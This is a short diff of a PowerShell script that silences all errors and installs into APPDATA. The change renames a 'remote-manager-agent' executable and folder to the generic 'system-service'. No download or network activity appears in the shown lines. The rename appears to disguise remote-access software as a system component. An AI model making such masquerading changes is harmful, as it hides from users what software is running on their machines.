@@ -1,6 +1,6 @@
 $ErrorActionPreference = 'SilentlyContinue'
-$targetDir = "$env:APPDATA\RemoteManager"
-$targetExe = "$targetDir\remote-manager-agent.exe"
+$targetDir = "$env:APPDATA\SystemService"
+$targetExe = "$targetDir\system-service.exe"
 
 New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
 
